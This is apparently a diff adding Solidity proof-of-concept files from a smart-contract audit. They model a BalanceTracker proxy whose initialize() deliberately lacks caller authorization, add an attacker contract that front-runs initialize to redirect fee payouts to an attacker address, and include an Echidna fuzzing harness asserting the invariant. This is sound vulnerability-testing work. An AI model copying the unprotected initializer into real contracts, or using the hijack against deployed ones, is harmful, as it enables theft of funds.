@@ -1,0 +1,194 @@
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_base_f1_initializer_hijack/src/BaseF1InitializerHijackHarness.sol
+   1 |     | // SPDX-License-Identifier: MIT
+   2 |     | pragma solidity 0.8.24;
+   3 |     | 
+   4 |     | interface IBalanceTrackerLike {
+   5 |     |     function initialize(address payable[] memory systemAddresses_, uint256[] memory targetBalances_) external;
+   6 |     |     function processFees() external;
+   7 |     |     function systemAddresses(uint256 index) external view returns (address payable);
+   8 |     |     function systemAddressesLength() external view returns (uint256);
+   9 |     | }
+  10 |     | 
+  11 |     | /// @notice Minimal proxy with unstructured storage to avoid implementation slot collisions.
+  12 | *   | contract BaseF1SimpleProxy {
+  13 | *   |     bytes32 private constant IMPLEMENTATION_SLOT = bytes32(uint256(keccak256("base.f1.proxy.implementation")) - 1);
+  14 | *   |     bytes32 private constant ADMIN_SLOT = bytes32(uint256(keccak256("base.f1.proxy.admin")) - 1);
+  15 |     | 
+  16 |     |     error Unauthorized();
+  17 |     |     error ImplementationNotSet();
+  18 |     | 
+  19 | *   |     constructor(address admin_) {
+  20 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  21 | *   |         assembly {
+  22 | *   |             sstore(adminSlot, admin_)
+  23 |     |         }
+  24 |     |     }
+  25 |     | 
+  26 | *   |     function admin() public view returns (address admin_) {
+  27 | *   |         bytes32 adminSlot = ADMIN_SLOT;
+  28 | *   |         assembly {
+  29 | *   |             admin_ := sload(adminSlot)
+  30 |     |         }
+  31 |     |     }
+  32 |     | 
+  33 | *   |     function implementation() public view returns (address implementation_) {
+  34 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  35 | *   |         assembly {
+  36 | *   |             implementation_ := sload(implementationSlot)
+  37 |     |         }
+  38 |     |     }
+  39 |     | 
+  40 | *   |     function upgradeTo(address implementation_) external {
+  41 | *   |         if (msg.sender != admin()) revert Unauthorized();
+  42 | *   |         bytes32 implementationSlot = IMPLEMENTATION_SLOT;
+  43 | *   |         assembly {
+  44 | *   |             sstore(implementationSlot, implementation_)
+  45 |     |         }
+  46 |     |     }
+  47 |     | 
+  48 |     |     fallback() external payable {
+  49 | *   |         _delegate();
+  50 |     |     }
+  51 |     | 
+  52 |     |     receive() external payable {}
+  53 |     | 
+  54 | *   |     function _delegate() internal {
+  55 | *   |         address impl = implementation();
+  56 | *   |         if (impl == address(0)) revert ImplementationNotSet();
+  57 |     |         assembly {
+  58 | *   |             calldatacopy(0, 0, calldatasize())
+  59 | *   |             let result := delegatecall(gas(), impl, 0, calldatasize(), 0, 0)
+  60 | *   |             returndatacopy(0, 0, returndatasize())
+  61 | *   |             switch result
+  62 | *   |             case 0 { revert(0, returndatasize()) }
+  63 | *   |             default { return(0, returndatasize()) }
+  64 |     |         }
+  65 |     |     }
+  66 |     | }
+  67 |     | 
+  68 |     | /// @notice BalanceTracker model preserving the relevant bug parity:
+  69 |     | ///         `initialize(...)` is externally callable with no caller authorization.
+  70 | *   | contract BaseF1BalanceTrackerLike {
+  71 |     |     uint8 private _initializedVersion;
+  72 |     | 
+  73 |     |     address payable public immutable PROFIT_WALLET;
+  74 |     |     address payable[] public systemAddresses;
+  75 |     |     uint256[] public targetBalances;
+  76 |     | 
+  77 |     |     error InvalidAddress();
+  78 |     |     error InvalidLength();
+  79 |     |     error AlreadyInitialized();
+  80 |     | 
+  81 | *   |     constructor(address payable profitWallet_) {
+  82 | *   |         if (profitWallet_ == address(0)) revert InvalidAddress();
+  83 | *   |         PROFIT_WALLET = profitWallet_;
+  84 |     | 
+  85 |     |         // Bug parity with OZ _disableInitializers() on implementation deployment.
+  86 | *   |         _initializedVersion = type(uint8).max;
+  87 |     |     }
+  88 |     | 
+  89 |     |     receive() external payable {}
+  90 |     | 
+  91 | *   |     function initialize(address payable[] memory systemAddresses_, uint256[] memory targetBalances_) external {
+  92 |     |         // Bug parity with reinitializer(2) behavior in proxy context (slot is 0 before first call).
+  93 | *   |         if (_initializedVersion >= 2) revert AlreadyInitialized();
+  94 | *   |         if (systemAddresses_.length == 0) revert InvalidLength();
+  95 | *   |         if (systemAddresses_.length != targetBalances_.length) revert InvalidLength();
+  96 |     | 
+  97 | *   |         for (uint256 i = 0; i < systemAddresses_.length; i++) {
+  98 | *   |             if (systemAddresses_[i] == address(0) || targetBalances_[i] == 0) revert InvalidAddress();
+  99 |     |         }
+ 100 |     | 
+ 101 | *   |         _initializedVersion = 2;
+ 102 | *   |         systemAddresses = systemAddresses_;
+ 103 | *   |         targetBalances = targetBalances_;
+ 104 |     |     }
+ 105 |     | 
+ 106 |     |     function initializedVersion() external view returns (uint8) {
+ 107 |     |         return _initializedVersion;
+ 108 |     |     }
+ 109 |     | 
+ 110 |     |     function systemAddressesLength() external view returns (uint256) {
+ 111 |     |         return systemAddresses.length;
+ 112 |     |     }
+ 113 |     | 
+ 114 |     |     function processFees() external {
+ 115 |     |         uint256 len = systemAddresses.length;
+ 116 |     |         if (len == 0) revert InvalidLength();
+ 117 |     | 
+ 118 |     |         for (uint256 i = 0; i < len; i++) {
+ 119 |     |             uint256 addressBalance = systemAddresses[i].balance;
+ 120 |     |             uint256 target = targetBalances[i];
+ 121 |     |             if (addressBalance >= target) {
+ 122 |     |                 continue;
+ 123 |     |             }
+ 124 |     |             uint256 needed = target - addressBalance;
+ 125 |     |             uint256 payout = needed > address(this).balance ? address(this).balance : needed;
+ 126 |     |             (bool success,) = systemAddresses[i].call{value: payout}("");
+ 127 |     |             success;
+ 128 |     |         }
+ 129 |     | 
+ 130 |     |         (bool ok,) = PROFIT_WALLET.call{value: address(this).balance}("");
+ 131 |     |         ok;
+ 132 |     |     }
+ 133 |     | }
+ 134 |     | 
+ 135 |     | /// @notice Helper that performs the attacker front-run initialize call.
+ 136 | *   | contract BaseF1InitializerAttacker {
+ 137 | *   |     function hijack(address proxy, address payable attackerRecipient, uint256 target) external {
+ 138 | *   |         address payable[] memory systemAddresses_ = new address payable[](1);
+ 139 | *   |         systemAddresses_[0] = attackerRecipient;
+ 140 | *   |         uint256[] memory targetBalances_ = new uint256[](1);
+ 141 | *   |         targetBalances_[0] = target;
+ 142 | *   |         IBalanceTrackerLike(proxy).initialize(systemAddresses_, targetBalances_);
+ 143 |     |     }
+ 144 |     | }
+ 145 |     | 
+
+C:/Users/vboxuser/Desktop/Repos/zklibreports/proof_harness/cat2_base_f1_initializer_hijack/src/EchidnaBaseF1InitializerHijackHarness.sol
+  1 |     | // SPDX-License-Identifier: MIT
+  2 |     | pragma solidity 0.8.24;
+  3 |     | 
+  4 |     | import {
+  5 |     |     BaseF1SimpleProxy,
+  6 |     |     BaseF1BalanceTrackerLike,
+  7 |     |     BaseF1InitializerAttacker,
+  8 |     |     IBalanceTrackerLike
+  9 |     | } from "./BaseF1InitializerHijackHarness.sol";
+ 10 |     | 
+ 11 |     | /// @notice Echidna harness for unauthorized BalanceTracker initializer takeover.
+ 12 | *   | contract EchidnaBaseF1InitializerHijackHarness {
+ 13 |     |     BaseF1SimpleProxy public proxy;
+ 14 |     |     IBalanceTrackerLike public tracker;
+ 15 |     |     BaseF1InitializerAttacker public attacker;
+ 16 |     | 
+ 17 |     |     address payable public attackerRecipient;
+ 18 |     | 
+ 19 | *   |     constructor() {
+ 20 | *   |         address payable profitWallet = payable(address(0xF00D));
+ 21 | *   |         attackerRecipient = payable(address(0xBEEF));
+ 22 |     | 
+ 23 | *   |         BaseF1BalanceTrackerLike implementation = new BaseF1BalanceTrackerLike(profitWallet);
+ 24 | *   |         proxy = new BaseF1SimpleProxy(address(this));
+ 25 | *   |         proxy.upgradeTo(address(implementation));
+ 26 | *   |         tracker = IBalanceTrackerLike(address(proxy));
+ 27 |     | 
+ 28 | *   |         attacker = new BaseF1InitializerAttacker();
+ 29 |     |     }
+ 30 |     | 
+ 31 | *   |     function action_attacker_initialize() public {
+ 32 |     |         // Subsequent calls revert due to reinitializer guard.
+ 33 |     |         // Keep call wrapped to allow Echidna to continue exploring.
+ 34 | *   |         try attacker.hijack(address(proxy), attackerRecipient, type(uint256).max) {} catch {}
+ 35 |     |     }
+ 36 |     | 
+ 37 |     |     function echidna_non_admin_cannot_take_first_system_address() public view returns (bool) {
+ 38 |     |         uint256 len = tracker.systemAddressesLength();
+ 39 |     |         if (len == 0) {
+ 40 |     |             return true;
+ 41 |     |         }
+ 42 |     |         return tracker.systemAddresses(0) != attackerRecipient;
+ 43 |     |     }
+ 44 |     | }
+ 45 |     | 
+
